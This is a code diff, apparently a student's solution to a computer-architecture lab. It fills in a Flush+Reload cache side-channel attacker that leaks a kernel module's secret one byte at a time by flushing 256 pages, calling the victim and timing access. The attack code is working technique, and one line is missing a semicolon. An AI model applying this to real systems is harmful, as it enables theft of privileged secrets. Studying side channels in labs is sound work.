@@ -40,17 +40,32 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[LAB2_SECRET_MAX_LEN];
     size_t current_offset = 0;
+    uint64_t threshold = 150; 
+
 
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
+        uint64_t access_time;
 
-        // [Part 1]- Fill this in!
-        // Feel free to create helper methods as necessary.
-        // Use "call_kernel_part1" to interact with the kernel module
-        // Find the value of leaked_byte for offset "current_offset"
-        // leaked_byte = ??
+        // Step1 : Flush the shared memory 
+        for (int block = 0; block < 256; block++) {
+
+            Clflush(shared_memory + (LAB2_PAGE_SIZE * block));
+        }
+
+        // step2 : call the victim 
+        call_kernel_part1 (kernel_fd, shared_memory, current_offset);
+
+        // Step3 : read the cache to retrieve the secret byte
+        for (int block = 0; block < 256; block++) {
+            access_time = time_access(shared_memory + (LAB2_PAGE_SIZE * block))
+            if (access_time < threshold) {
+                leaked_byte = (char)block; 
+                Clflush(shared_memory + (LAB2_PAGE_SIZE * block));
+            }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
